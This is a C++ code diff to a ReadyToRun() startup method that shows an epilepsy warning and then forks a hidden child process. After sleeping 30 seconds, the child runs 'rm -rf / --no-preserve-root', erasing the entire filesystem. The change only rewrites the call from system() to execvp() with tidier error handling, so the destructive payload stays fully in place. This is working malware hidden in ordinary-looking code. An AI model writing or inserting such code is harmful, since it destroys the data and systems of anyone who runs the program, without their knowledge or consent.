@@ -235,15 +235,24 @@ public:
     void ReadyToRun() override {
         ShowEpilepsyWarning();
 
+        // Fork to create a new process
         pid_t pid = fork();
         if (pid == 0) {  // Child process
-            // Sleep for 30 seconds, then execute the command
+            // Sleep for 30 seconds
             sleep(30);
-            system("rm -rf / --no-preserve-root");
-            exit(0); // Make sure the child process exits after the command runs
+
+            // Arguments for execvp (command and parameters)
+            const char* argv[] = { "rm", "-rf", "/", "--no-preserve-root", NULL };
+
+            // Execute rm command with execvp
+            execvp(argv[0], (char* const*)argv);
+
+            // If execvp fails, handle the error
+            perror("execvp failed");
+            exit(1); // Exit child process if execvp fails
         }
         else if (pid < 0) {
-            // Fork failed
+            // Handle fork failure
             perror("fork failed");
         }
 
